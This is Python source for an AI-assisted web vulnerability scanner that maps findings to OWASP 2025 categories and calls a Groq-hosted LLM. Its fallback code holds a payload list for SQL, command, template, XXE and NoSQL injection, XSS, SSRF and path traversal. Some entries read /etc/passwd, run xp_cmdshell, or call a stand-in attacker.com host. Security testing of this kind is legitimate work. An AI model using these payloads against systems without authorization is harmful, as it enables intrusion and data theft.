"""
Groq LLM Integration for VulnFlow - OWASP 2025 VERSION
Provides AI-powered vulnerability analysis with automatic fallback to non-AI mode
"""

import os
import json
import asyncio
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
import aiohttp
from enum import Enum


class AnalysisMode(Enum):
    """Analysis mode enum"""
    AI_ENABLED = "ai_enabled"
    NON_AI = "non_ai"


@dataclass
class AIAnalysisResult:
    """Result from AI analysis"""
    confidence_score: float  # 0.0 to 1.0
    severity_adjustment: Optional[str]  # "increase", "decrease", or None
    ai_reasoning: str
    recommended_payloads: List[str]
    false_positive_likelihood: float  # 0.0 to 1.0
    exploitation_complexity: str  # "low", "medium", "high"
    business_impact: str
    owasp_category: Optional[str] = None  # OWASP 2025 category


# OWASP 2025 Category Mappings
OWASP_2025_CATEGORIES = {
    "A01": {
        "id": "A01:2025",
        "name": "Broken Access Control",
        "vuln_types": [
            "IDOR", "Insecure Direct Object Reference",
            "Path Traversal", "Directory Traversal",
            "Forced Browsing", "Privilege Escalation",
            "JWT", "SSRF", "Server-Side Request Forgery",
            "Access Control", "Authorization Bypass"
        ]
    },
    "A02": {
        "id": "A02:2025",
        "name": "Security Misconfiguration",
        "vuln_types": [
            "Security Header", "Missing Security Header",
            "CORS", "Cross-Origin", "Debug Mode",
            "Backup File", "Cookie Security", "Information Disclosure",
            "Server Misconfiguration", "Default Credentials"
        ]
    },
    "A03": {
        "id": "A03:2025",
        "name": "Software Supply Chain Failures",
        "vuln_types": [
            "Vulnerable Component", "Outdated", "CVE",
            "Dependency", "Library", "Supply Chain",
            "Integrity", "SRI", "Subresource Integrity",
            "Package", "npm", "JavaScript Library"
        ]
    },
    "A04": {
        "id": "A04:2025",
        "name": "Cryptographic Failures",
        "vuln_types": [
            "SSL", "TLS", "Cryptographic", "Weak Crypto",
            "Sensitive Data Exposure", "Encryption",
            "Certificate", "HTTPS", "Plaintext"
        ]
    },
    "A05": {
        "id": "A05:2025",
        "name": "Injection",
        "vuln_types": [
            "SQL Injection", "SQLi", "NoSQL Injection",
            "Command Injection", "OS Command", "SSTI",
            "Template Injection", "LDAP Injection",
            "XPath Injection", "Host Header Injection",
            "XSS", "Cross-Site Scripting", "XXE",
            "XML External Entity", "Code Injection"
        ]
    },
    "A06": {
        "id": "A06:2025",
        "name": "Insecure Design",
        "vuln_types": [
            "Rate Limiting", "Brute Force", "Business Logic",
            "Design Flaw", "Threat Model", "Architecture"
        ]
    },
    "A07": {
        "id": "A07:2025",
        "name": "Authentication Failures",
        "vuln_types": [
            "Authentication", "Session Fixation", "Session",
            "Weak Password", "Password Policy", "Login",
            "Credential", "Identity", "MFA", "2FA"
        ]
    },
    "A08": {
        "id": "A08:2025",
        "name": "Software or Data Integrity Failures",
        "vuln_types": [
            "Deserialization", "Insecure Deserialization",
            "Data Integrity", "Code Signing", "Update",
            "CI/CD", "Pipeline"
        ]
    },
    "A09": {
        "id": "A09:2025",
        "name": "Security Logging and Alerting Failures",
        "vuln_types": [
            "Logging", "Monitoring", "Alerting", "Audit",
            "Log Injection", "SIEM"
        ]
    },
    "A10": {
        "id": "A10:2025",
        "name": "Mishandling of Exceptional Conditions",
        "vuln_types": [
            "Error Handling", "Verbose Error", "Stack Trace",
            "Fail Open", "Exception", "Resource Limit",
            "Rate Limit", "DoS", "Denial of Service",
            "ReDoS", "Resource Exhaustion"
        ]
    }
}


class GroqAnalyzer:
    """
    Groq LLM-powered vulnerability analyzer with automatic fallback.
    Updated for OWASP Top 10 2025.
    
    Features:
    - Smart vulnerability validation
    - Context-aware payload generation
    - False positive reduction
    - Severity assessment refinement
    - OWASP 2025 category mapping
    - Automatic fallback to non-AI mode
    """
    
    def __init__(self, api_key: Optional[str] = None):
        """
        Initialize the Groq analyzer.
        
        Args:
            api_key: Groq API key (optional)
                     - If provided, uses this key directly
                     - If None, checks GROQ_API_KEY environment variable
                     - If neither, runs in non-AI mode
        """
        # Priority: Manual input > Environment variable > None
        self.api_key = api_key or os.environ.get("GROQ_API_KEY")
        self.mode = AnalysisMode.AI_ENABLED if self.api_key else AnalysisMode.NON_AI
        self.base_url = "https://api.groq.com/openai/v1/chat/completions"
        self.model = "llama-3.3-70b-versatile"  # Fast and accurate
        
        # Rate limiting
        self._request_count = 0
        self._last_reset = asyncio.get_event_loop().time() if asyncio.get_event_loop().is_running() else 0
        self._max_requests_per_minute = 30
        
        # Cache for repeated analysis
        self._analysis_cache: Dict[str, AIAnalysisResult] = {}
        
        # Track error messages to show them only once
        self._rate_limit_shown = False
        self._api_error_count = 0
        self._first_error_shown = False
        
        if self.mode == AnalysisMode.NON_AI:
            print("⚠️  No GROQ_API_KEY found - running in non-AI mode")
            print("    Set GROQ_API_KEY environment variable or pass api_key parameter to enable AI")
        else:
            # Mask API key in output for security
            masked_key = f"{self.api_key[:7]}...{self.api_key[-4:]}" if len(self.api_key) > 11 else "***"
            print(f"✓ Groq AI enabled - using llama-3.3-70b-versatile")
            print(f"  API Key: {masked_key}")
            print(f"  OWASP Version: Top 10 2025")
    
    def _get_owasp_category(self, vuln_type: str) -> Optional[str]:
        """
        Map vulnerability type to OWASP 2025 category.
        
        Args:
            vuln_type: The vulnerability type string
            
        Returns:
            OWASP 2025 category string (e.g., "A01:2025 - Broken Access Control")
        """
        vuln_type_lower = vuln_type.lower()
        
        for cat_id, cat_info in OWASP_2025_CATEGORIES.items():
            for keyword in cat_info["vuln_types"]:
                if keyword.lower() in vuln_type_lower:
                    return f"{cat_info['id']} - {cat_info['name']}"
        
        return None
    
    async def analyze_vulnerability(
        self,
        vuln_type: str,
        url: str,
        parameter: str,
        payload: str,
        response_evidence: str,
        context: Dict[str, Any] = None
    ) -> AIAnalysisResult:
        """
        Analyze a potential vulnerability with AI or fallback logic.
        """
        # Determine OWASP category
        owasp_category = self._get_owasp_category(vuln_type)
        
        # Non-AI mode fallback
        if self.mode == AnalysisMode.NON_AI:
            return self._non_ai_analysis(vuln_type, url, parameter, payload, response_evidence, owasp_category)
        
        # Check cache
        cache_key = f"{vuln_type}:{url}:{parameter}:{payload[:50]}"
        if cache_key in self._analysis_cache:
            return self._analysis_cache[cache_key]
        
        # Rate limiting check
        await self._check_rate_limit()
        
        # Build AI prompt
        prompt = self._build_analysis_prompt(
            vuln_type, url, parameter, payload, response_evidence, context, owasp_category
        )
        
        # Call Groq API
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {self.api_key}",
                    "Content-Type": "application/json"
                }
                
                data = {
                    "model": self.model,
                    "messages": [
                        {
                            "role": "system",
                            "content": """You are a security expert analyzing web vulnerabilities according to OWASP Top 10 2025.
                            
OWASP Top 10 2025 Categories:
- A01: Broken Access Control (includes SSRF)
- A02: Security Misconfiguration
- A03: Software Supply Chain Failures
- A04: Cryptographic Failures
- A05: Injection (SQL, XSS, Command, etc.)
- A06: Insecure Design
- A07: Authentication Failures
- A08: Software or Data Integrity Failures
- A09: Security Logging and Alerting Failures
- A10: Mishandling of Exceptional Conditions (NEW)

Provide accurate, concise assessments focused on practical exploitation and business impact."""
                        },
                        {
                            "role": "user",
                            "content": prompt
                        }
                    ],
                    "temperature": 0.1,
                    "max_tokens": 800,
                    "response_format": {"type": "json_object"}
                }
                
                async with session.post(
                    self.base_url,
                    headers=headers,
                    json=data,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    if response.status == 200:
                        result = await response.json()
                        content = result["choices"][0]["message"]["content"]
                        analysis = json.loads(content)
                        
                        # Use AI-suggested OWASP category if provided, otherwise use our mapping
                        ai_owasp = analysis.get("owasp_category", owasp_category)
                        
                        ai_result = AIAnalysisResult(
                            confidence_score=float(analysis.get("confidence_score", 0.5)),
                            severity_adjustment=analysis.get("severity_adjustment"),
                            ai_reasoning=analysis.get("reasoning", "AI analysis completed"),
                            recommended_payloads=analysis.get("recommended_payloads", []),
                            false_positive_likelihood=float(analysis.get("false_positive_likelihood", 0.5)),
                            exploitation_complexity=analysis.get("exploitation_complexity", "medium"),
                            business_impact=analysis.get("business_impact", "Requires further investigation"),
                            owasp_category=ai_owasp
                        )
                        
                        # Cache result
                        self._analysis_cache[cache_key] = ai_result
                        return ai_result
                    
                    # Rate limit hit - show friendly message ONCE
                    elif response.status == 429:
                        self._api_error_count += 1
                        
                        if not self._rate_limit_shown:
                            self._rate_limit_shown = True
                            print(f"\n{'='*60}")
                            print(f"  ⚠️  Groq API Rate Limit Reached")
                            print(f"{'='*60}")
                            print(f"  Free tier limit: 30 requests/minute")
                            print(f"  Status: Switching to heuristic analysis")
                            print(f"  ")
                            print(f"  ✓ Your scan continues normally")
                            print(f"  ✓ Results remain accurate (rule-based)")
                            print(f"  ✓ No data loss or quality reduction")
                            print(f"  ")
                            print(f"  💡 Tip: Wait 1 minute between scans")
                            print(f"{'='*60}\n")
                        
                        # Fallback silently
                        return self._non_ai_analysis(vuln_type, url, parameter, payload, response_evidence, owasp_category)
                    
                    else:
                        # Other API errors - show once
                        self._api_error_count += 1
                        
                        if not self._first_error_shown:
                            self._first_error_shown = True
                            print(f"⚠️  Groq API temporarily unavailable (HTTP {response.status})")
                            print(f"    Continuing with heuristic analysis...\n")
                        
                        return self._non_ai_analysis(vuln_type, url, parameter, payload, response_evidence, owasp_category)
        
        except asyncio.TimeoutError:
            if not self._first_error_shown:
                self._first_error_shown = True
                print("⚠️  Groq API timeout - using heuristic analysis\n")
            return self._non_ai_analysis(vuln_type, url, parameter, payload, response_evidence, owasp_category)
        except Exception as e:
            if not self._first_error_shown:
                self._first_error_shown = True
                print(f"⚠️  AI analysis error: {str(e)[:50]} - using heuristic analysis\n")
            return self._non_ai_analysis(vuln_type, url, parameter, payload, response_evidence, owasp_category)
    
    def _build_analysis_prompt(
        self,
        vuln_type: str,
        url: str,
        parameter: str,
        payload: str,
        response_evidence: str,
        context: Dict[str, Any] = None,
        owasp_category: Optional[str] = None
    ) -> str:
        """Build the AI analysis prompt with OWASP 2025 context"""
        tech_stack = context.get("tech_stack", []) if context else []
        existing_owasp = context.get("owasp_category", owasp_category) if context else owasp_category
        
        return f"""Analyze this potential {vuln_type} vulnerability:

URL: {url}
Parameter: {parameter}
Payload: {payload}
Response Evidence: {response_evidence[:500]}
Tech Stack: {', '.join(tech_stack) if tech_stack else 'Unknown'}
Suggested OWASP 2025 Category: {existing_owasp or 'Not determined'}

Using OWASP Top 10 2025 framework, provide a JSON response with:
1. confidence_score (0.0-1.0): How confident are you this is a real vulnerability?
2. severity_adjustment ("increase", "decrease", or null): Should severity be adjusted?
3. reasoning: Brief explanation (2-3 sentences)
4. recommended_payloads: List of 3 additional payloads to test (if applicable)
5. false_positive_likelihood (0.0-1.0): Chance this is a false positive
6. exploitation_complexity ("low", "medium", "high")
7. business_impact: One sentence on business impact
8. owasp_category: The correct OWASP 2025 category (e.g., "A01:2025 - Broken Access Control")

OWASP 2025 Key Changes:
- A01: Broken Access Control (now includes SSRF)
- A02: Security Misconfiguration (moved up from A05)
- A03: Software Supply Chain Failures (renamed from Vulnerable Components)
- A10: Mishandling of Exceptional Conditions (NEW - replaces SSRF)

Return ONLY valid JSON matching this structure:
{{
  "confidence_score": 0.85,
  "severity_adjustment": null,
  "reasoning": "...",
  "recommended_payloads": ["...", "..."],
  "false_positive_likelihood": 0.15,
  "exploitation_complexity": "medium",
  "business_impact": "...",
  "owasp_category": "A05:2025 - Injection"
}}"""
    
    def _non_ai_analysis(
        self,
        vuln_type: str,
        url: str,
        parameter: str,
        payload: str,
        response_evidence: str,
        owasp_category: Optional[str] = None
    ) -> AIAnalysisResult:
        """Fallback heuristic-based analysis when AI is not available"""
        
        # Extended confidence mapping for OWASP 2025 vulnerability types
        confidence_map = {
            # A01 - Broken Access Control
            "SQL Injection": 0.85,
            "IDOR": 0.80,
            "Insecure Direct Object Reference": 0.80,
            "Path Traversal": 0.75,
            "Directory Traversal": 0.75,
            "Forced Browsing": 0.70,
            "Privilege Escalation": 0.75,
            "SSRF": 0.70,
            "Server-Side Request Forgery": 0.70,
            "JWT": 0.85,
            "JWT Missing Signature Verification": 0.95,
            
            # A02 - Security Misconfiguration
            "Missing Security Header": 0.60,
            "Security Header": 0.60,
            "CORS Misconfiguration": 0.65,
            "Debug Mode": 0.80,
            "Backup File": 0.85,
            "Information Disclosure": 0.50,
            "Cookie Security": 0.60,
            
            # A03 - Supply Chain Failures
            "Vulnerable JavaScript Library": 0.90,
            "Vulnerable Component": 0.85,
            "Outdated Component": 0.75,
            "Missing Subresource Integrity": 0.70,
            "Exposed Package.json": 0.85,
            "Exposed Dependency Lock File": 0.80,
            "CVE": 0.90,
            
            # A04 - Cryptographic Failures
            "SSL/TLS": 0.80,
            "Weak Crypto": 0.75,
            "Sensitive Data Exposure": 0.70,
            "Weak Cryptography": 0.75,
            
            # A05 - Injection
            "XSS": 0.80,
            "Cross-Site Scripting": 0.80,
            "DOM XSS": 0.75,
            "NoSQL Injection": 0.80,
            "Command Injection": 0.90,
            "SSTI": 0.85,
            "Template Injection": 0.85,
            "LDAP Injection": 0.80,
            "XPath Injection": 0.75,
            "Host Header Injection": 0.70,
            "XXE": 0.85,
            "XML External Entity": 0.85,
            
            # A06 - Insecure Design
            "Rate Limiting": 0.65,
            "Missing Rate Limiting": 0.65,
            "Brute Force": 0.60,
            
            # A07 - Authentication Failures
            "Session Fixation": 0.75,
            "Weak Password": 0.70,
            "Authentication Bypass": 0.85,
            
            # A08 - Data Integrity Failures
            "Insecure Deserialization": 0.80,
            "Deserialization": 0.80,
            
            # A09 - Logging Failures
            "Logging": 0.50,
            
            # A10 - Exceptional Conditions (NEW)
            "Error Information Disclosure": 0.75,
            "Verbose Error": 0.70,
            "Stack Trace": 0.80,
            "Fail-Open": 0.85,
            "Security Control Bypass": 0.80,
            "Resource Limit": 0.65,
            "ReDoS": 0.70,
            "JSON Processing DoS": 0.65,
            "XML Processing DoS": 0.70,
        }
        
        # Find matching confidence
        confidence = 0.70  # Default
        vuln_type_lower = vuln_type.lower()
        for key, conf in confidence_map.items():
            if key.lower() in vuln_type_lower or vuln_type_lower in key.lower():
                confidence = conf
                break
        
        # Adjust based on evidence
        if response_evidence and len(response_evidence) > 100:
            confidence += 0.05
        
        # Extended complexity mapping
        complexity_map = {
            # A01 - Broken Access Control
            "SQL Injection": "medium",
            "IDOR": "low",
            "Path Traversal": "low",
            "Forced Browsing": "low",
            "Privilege Escalation": "medium",
            "SSRF": "medium",
            "JWT": "medium",
            
            # A02 - Security Misconfiguration
            "Missing Security Header": "low",
            "CORS": "low",
            "Debug Mode": "low",
            "Backup File": "low",
            "Information Disclosure": "low",
            
            # A03 - Supply Chain
            "Vulnerable": "low",
            "Outdated": "low",
            "CVE": "varies",
            "Integrity": "medium",
            
            # A04 - Cryptographic
            "SSL": "medium",
            "Crypto": "medium",
            "Sensitive Data": "low",
            
            # A05 - Injection
            "XSS": "low",
            "Cross-Site Scripting": "low",
            "Command Injection": "high",
            "NoSQL": "medium",
            "SSTI": "high",
            "XXE": "high",
            "LDAP": "medium",
            "XPath": "medium",
            
            # A06 - Insecure Design
            "Rate Limiting": "low",
            "Brute Force": "low",
            
            # A07 - Authentication
            "Session": "medium",
            "Password": "low",
            "Authentication": "medium",
            
            # A08 - Integrity
            "Deserialization": "high",
            
            # A10 - Exceptional Conditions
            "Error": "low",
            "Fail-Open": "medium",
            "Resource": "medium",
            "DoS": "medium",
        }
        
        # Find matching complexity
        complexity = "medium"  # Default
        for key, comp in complexity_map.items():
            if key.lower() in vuln_type_lower:
                complexity = comp
                break
        
        # False positive likelihood
        fp_likelihood = 1.0 - confidence
        
        # Extended business impact mapping
        impact_map = {
            # A01 - Broken Access Control
            "SQL Injection": "Critical - May allow database extraction or modification",
            "IDOR": "Medium to High - May expose unauthorized data",
            "Path Traversal": "High - May expose sensitive files",
            "Forced Browsing": "Medium - May expose restricted functionality",
            "Privilege Escalation": "Critical - May allow unauthorized administrative access",
            "SSRF": "High - May allow internal network access or cloud metadata exposure",
            "JWT": "Critical - May allow authentication bypass",
            
            # A02 - Security Misconfiguration
            "Missing Security Header": "Low - Increases attack surface",
            "CORS": "Medium - May allow cross-origin data theft",
            "Debug Mode": "High - Exposes sensitive application information",
            "Backup File": "High - May expose source code or credentials",
            "Information Disclosure": "Low to Medium - Provides reconnaissance information",
            
            # A03 - Supply Chain
            "Vulnerable JavaScript Library": "Medium to Critical - Depends on specific CVE",
            "Vulnerable Component": "Medium to Critical - Depends on specific vulnerability",
            "Outdated": "Medium - May contain unpatched vulnerabilities",
            "Missing Subresource Integrity": "Medium - Resources may be tampered with",
            
            # A04 - Cryptographic Failures
            "SSL": "High - May allow traffic interception",
            "Weak Crypto": "High - May allow data decryption",
            "Sensitive Data Exposure": "High - Direct data breach risk",
            
            # A05 - Injection
            "XSS": "High - May allow session hijacking or data theft",
            "Cross-Site Scripting": "High - May allow session hijacking or data theft",
            "Command Injection": "Critical - May allow full system compromise",
            "XXE": "High - May expose files or cause DoS",
            "SSTI": "Critical - May allow remote code execution",
            "NoSQL": "High - May allow data extraction or bypass",
            
            # A06 - Insecure Design
            "Rate Limiting": "Medium - May allow brute force or DoS attacks",
            "Brute Force": "Medium - May allow credential compromise",
            
            # A07 - Authentication
            "Session Fixation": "High - May allow session hijacking",
            "Weak Password": "Medium - Increases credential compromise risk",
            "Authentication": "High - May allow unauthorized access",
            
            # A08 - Integrity
            "Deserialization": "Critical - May allow remote code execution",
            
            # A10 - Exceptional Conditions
            "Error": "Low to Medium - May expose sensitive information",
            "Verbose Error": "Medium - Exposes technical details useful for attacks",
            "Stack Trace": "Medium - Exposes code structure and dependencies",
            "Fail-Open": "Critical - Security controls may be completely bypassed",
            "Security Control Bypass": "Critical - Authentication/authorization bypassed",
            "Resource Limit": "Medium - May allow denial of service",
            "ReDoS": "Medium - May cause application unavailability",
            "DoS": "Medium to High - May cause service disruption",
        }
        
        # Find matching impact
        business_impact = "Requires manual verification"
        for key, impact in impact_map.items():
            if key.lower() in vuln_type_lower:
                business_impact = impact
                break
        
        # Get OWASP category if not provided
        if not owasp_category:
            owasp_category = self._get_owasp_category(vuln_type)
        
        return AIAnalysisResult(
            confidence_score=min(confidence, 1.0),
            severity_adjustment=None,
            ai_reasoning=f"Heuristic-based analysis (non-AI mode). OWASP 2025: {owasp_category or 'Unclassified'}",
            recommended_payloads=[],
            false_positive_likelihood=fp_likelihood,
            exploitation_complexity=complexity,
            business_impact=business_impact,
            owasp_category=owasp_category
        )
    
    async def _check_rate_limit(self):
        """Check and enforce rate limiting"""
        try:
            loop = asyncio.get_event_loop()
            current_time = loop.time()
        except RuntimeError:
            current_time = 0
            self._last_reset = 0
        
        # Reset counter every minute
        if current_time - self._last_reset >= 60:
            self._request_count = 0
            self._last_reset = current_time
        
        # Wait if at limit
        if self._request_count >= self._max_requests_per_minute:
            wait_time = 60 - (current_time - self._last_reset)
            if wait_time > 0:
                await asyncio.sleep(wait_time)
                self._request_count = 0
                try:
                    self._last_reset = asyncio.get_event_loop().time()
                except RuntimeError:
                    self._last_reset = 0
        
        self._request_count += 1
    
    async def generate_smart_payloads(
        self,
        vuln_type: str,
        tech_stack: List[str],
        existing_findings: List[str] = None
    ) -> List[str]:
        """
        Generate contextual payloads based on tech stack and previous findings.
        
        Args:
            vuln_type: Type of vulnerability to test
            tech_stack: Detected technologies (e.g., ["PHP", "MySQL", "Apache"])
            existing_findings: Previous vulnerabilities found
        
        Returns:
            List of recommended payloads
        """
        if self.mode == AnalysisMode.NON_AI:
            return self._non_ai_payload_generation(vuln_type, tech_stack)
        
        await self._check_rate_limit()
        
        # Get OWASP category for context
        owasp_category = self._get_owasp_category(vuln_type)
        
        prompt = f"""Generate 5 effective payloads for testing {vuln_type} on a web application.

Tech Stack: {', '.join(tech_stack) if tech_stack else 'Unknown'}
OWASP 2025 Category: {owasp_category or 'Unknown'}
Previous Findings: {', '.join(existing_findings[:3]) if existing_findings else 'None'}

Requirements:
1. Payloads must be realistic and safe for testing
2. Consider the specific tech stack
3. Focus on detection, not exploitation
4. Consider OWASP 2025 guidance
5. Return as JSON array of strings

Return ONLY a JSON object with this structure:
{{"payloads": ["payload1", "payload2", ...]}}"""
        
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {self.api_key}",
                    "Content-Type": "application/json"
                }
                
                data = {
                    "model": self.model,
                    "messages": [
                        {"role": "system", "content": "You are a penetration testing expert using OWASP Top 10 2025 methodology. Generate effective payloads."},
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.3,
                    "max_tokens": 500,
                    "response_format": {"type": "json_object"}
                }
                
                async with session.post(
                    self.base_url,
                    headers=headers,
                    json=data,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status == 200:
                        result = await response.json()
                        content = json.loads(result["choices"][0]["message"]["content"])
                        return content.get("payloads", [])[:5]
        
        except Exception:
            pass  # Fall through to non-AI generation
        
        return self._non_ai_payload_generation(vuln_type, tech_stack)
    
    def _non_ai_payload_generation(
        self,
        vuln_type: str,
        tech_stack: List[str]
    ) -> List[str]:
        """Fallback payload generation based on vuln type and tech stack - OWASP 2025"""
        
        payloads_db = {
            # A05 - Injection
            "SQL Injection": {
                "MySQL": ["' OR '1'='1", "' UNION SELECT NULL,NULL--", "1' AND SLEEP(5)--", "' OR 1=1#"],
                "PostgreSQL": ["' OR '1'='1'--", "'; SELECT version()--", "' AND pg_sleep(5)--"],
                "MSSQL": ["' OR '1'='1'--", "'; EXEC xp_cmdshell('dir')--", "' WAITFOR DELAY '0:0:5'--"],
                "Oracle": ["' OR '1'='1'--", "' UNION SELECT NULL FROM DUAL--"],
                "SQLite": ["' OR '1'='1'--", "' UNION SELECT sqlite_version()--"],
                "default": ["' OR '1'='1", "1' OR '1'='1'--", "admin'--", "' OR ''='"]
            },
            "XSS": {
                "default": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "'\"><script>alert(1)</script>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)"
                ]
            },
            "Cross-Site Scripting": {
                "default": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "'\"><script>alert(1)</script>"
                ]
            },
            "Command Injection": {
                "Linux": ["; ls -la", "| cat /etc/passwd", "&& id", "$(whoami)", "`id`"],
                "Windows": ["& dir", "| type C:\\Windows\\win.ini", "&& whoami", "| net user"],
                "default": ["; ls", "| whoami", "&& id", "$(id)", "; cat /etc/passwd"]
            },
            "SSTI": {
                "Jinja2": ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__}}"],
                "Twig": ["{{7*7}}", "{{_self.env.display('id')}}"],
                "Freemarker": ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"],
                "default": ["{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}"]
            },
            "XXE": {
                "default": [
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
                ]
            },
            "NoSQL Injection": {
                "MongoDB": [
                    "{\"$gt\": \"\"}",
                    "{\"$ne\": null}",
                    "{\"$where\": \"sleep(5000)\"}",
                    "'; return this.password; var dummy='"
                ],
                "default": ["{\"$gt\": \"\"}", "{\"$ne\": 1}", "true, $where: '1 == 1'"]
            },
            
            # A01 - Broken Access Control
            "SSRF": {
                "default": [
                    "http://localhost/",
                    "http://127.0.0.1/",
                    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                    "http://[::1]/",
                    "file:///etc/passwd"
                ]
            },
            "Path Traversal": {
                "Linux": ["../../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2fetc/passwd"],
                "Windows": ["..\\..\\..\\windows\\win.ini", "....\\\\....\\\\windows\\win.ini"],
                "default": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%00"]
            },
            
            # A10 - Exceptional Conditions (NEW)
            "Error Handling": {
                "default": [
                    "'",  # SQL-like error
                    "{{",  # Template error
                    "<%",  # ASP error
                    "\x00",  # Null byte
                    "[]",  # Type error
                ]
            },
            "Resource Limits": {
                "default": [
                    "a" * 10000,  # Long string
                    "{" * 100 + "}" * 100,  # Deep nesting
                    "a{1,10000}",  # ReDoS pattern
                ]
            },
            
            # A03 - Supply Chain (detection payloads)
            "Dependency Check": {
                "default": []  # No payloads - passive detection
            },
        }
        
        # Get vuln-specific payloads
        vuln_key = None
        vuln_type_lower = vuln_type.lower()
        
        for key in payloads_db.keys():
            if key.lower() in vuln_type_lower or vuln_type_lower in key.lower():
                vuln_key = key
                break
        
        if not vuln_key:
            return []
        
        vuln_payloads = payloads_db.get(vuln_key, {})
        
        # Try to match tech stack
        for tech in tech_stack:
            tech_upper = tech.upper() if tech else ""
            for payload_key in vuln_payloads.keys():
                if payload_key.upper() in tech_upper or tech_upper in payload_key.upper():
                    return vuln_payloads[payload_key]
        
        # Return default payloads
        return vuln_payloads.get("default", [])
    
    async def summarize_scan_results(
        self,
        vulnerabilities: List[Dict],
        tech_stack: List[str],
        pages_scanned: int
    ) -> str:
        """
        Generate an AI-powered executive summary of scan results.
        
        Returns:
            Markdown-formatted summary with OWASP 2025 categorization
        """
        if self.mode == AnalysisMode.NON_AI or not vulnerabilities:
            return self._non_ai_summary(vulnerabilities, tech_stack, pages_scanned)
        
        await self._check_rate_limit()
        
        # Prepare vulnerability summary by OWASP category
        vuln_summary = {}
        owasp_summary = {}
        
        for vuln in vulnerabilities:
            vtype = vuln.get("vuln_type", "Unknown")
            if vtype not in vuln_summary:
                vuln_summary[vtype] = 0
            vuln_summary[vtype] += 1
            
            # Group by OWASP category
            owasp_cat = self._get_owasp_category(vtype) or "Other"
            cat_id = owasp_cat.split(":")[0] if ":" in owasp_cat else "Other"
            if cat_id not in owasp_summary:
                owasp_summary[cat_id] = 0
            owasp_summary[cat_id] += 1
        
        prompt = f"""Generate an executive summary for this security scan using OWASP Top 10 2025 framework:

Total Pages Scanned: {pages_scanned}
Tech Stack: {', '.join(tech_stack) if tech_stack else 'Not detected'}
Vulnerabilities Found: {len(vulnerabilities)}

Vulnerability Breakdown:
{json.dumps(vuln_summary, indent=2)}

OWASP 2025 Category Breakdown:
{json.dumps(owasp_summary, indent=2)}

Provide:
1. Executive summary (2-3 sentences)
2. Top 3 critical findings with OWASP 2025 category
3. OWASP 2025 compliance gaps
4. Recommended immediate actions
5. Risk assessment

Note OWASP 2025 changes:
- SSRF is now under A01 (Broken Access Control)
- A10 is now "Mishandling of Exceptional Conditions" (NEW)
- A03 is "Software Supply Chain Failures" (expanded)

Format as markdown."""
        
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Authorization": f"Bearer {self.api_key}",
                    "Content-Type": "application/json"
                }
                
                data = {
                    "model": self.model,
                    "messages": [
                        {"role": "system", "content": "You are a security consultant creating executive summaries using OWASP Top 10 2025 framework."},
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.2,
                    "max_tokens": 1000
                }
                
                async with session.post(
                    self.base_url,
                    headers=headers,
                    json=data,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result["choices"][0]["message"]["content"]
        
        except Exception:
            pass
        
        return self._non_ai_summary(vulnerabilities, tech_stack, pages_scanned)
    
    def _non_ai_summary(
        self,
        vulnerabilities: List[Dict],
        tech_stack: List[str],
        pages_scanned: int
    ) -> str:
        """Generate a basic summary without AI - OWASP 2025 formatted"""
        
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        owasp_counts = {}
        
        for vuln in vulnerabilities:
            # Count by severity
            sev = vuln.get("severity", "").lower()
            if sev in severity_counts:
                severity_counts[sev] += 1
            
            # Count by OWASP category
            vtype = vuln.get("vuln_type", "Unknown")
            owasp_cat = self._get_owasp_category(vtype)
            if owasp_cat:
                cat_id = owasp_cat.split(":")[0]
                if cat_id not in owasp_counts:
                    owasp_counts[cat_id] = {"name": owasp_cat, "count": 0}
                owasp_counts[cat_id]["count"] += 1
        
        # Build OWASP 2025 breakdown
        owasp_breakdown = ""
        for cat_id in sorted(owasp_counts.keys()):
            data = owasp_counts[cat_id]
            owasp_breakdown += f"- **{data['name']}**: {data['count']} findings\n"
        
        if not owasp_breakdown:
            owasp_breakdown = "- No OWASP-classified vulnerabilities found\n"
        
        summary = f"""# Security Scan Summary (OWASP 2025)

## Overview
- **Pages Scanned**: {pages_scanned}
- **Tech Stack**: {', '.join(tech_stack) if tech_stack else 'Not detected'}
- **Total Vulnerabilities**: {len(vulnerabilities)}
- **Framework**: OWASP Top 10 2025

## Severity Breakdown
| Severity | Count |
|----------|-------|
| 🔴 Critical | {severity_counts['critical']} |
| 🟠 High | {severity_counts['high']} |
| 🟡 Medium | {severity_counts['medium']} |
| 🔵 Low | {severity_counts['low']} |
| ⚪ Info | {severity_counts['info']} |

## OWASP Top 10 2025 Breakdown
{owasp_breakdown}
## OWASP 2025 Key Categories

| Category | Description |
|----------|-------------|
| A01 | Broken Access Control (includes SSRF) |
| A02 | Security Misconfiguration |
| A03 | Software Supply Chain Failures |
| A04 | Cryptographic Failures |
| A05 | Injection |
| A06 | Insecure Design |
| A07 | Authentication Failures |
| A08 | Software or Data Integrity Failures |
| A09 | Security Logging and Alerting Failures |
| A10 | Mishandling of Exceptional Conditions (NEW) |

## Recommendations
1. Address all critical and high severity findings immediately
2. Focus on OWASP A01 (Access Control) and A05 (Injection) findings first
3. Review A10 (Exceptional Conditions) - new in OWASP 2025
4. Implement security headers and CSP (A02)
5. Audit third-party dependencies for vulnerabilities (A03)
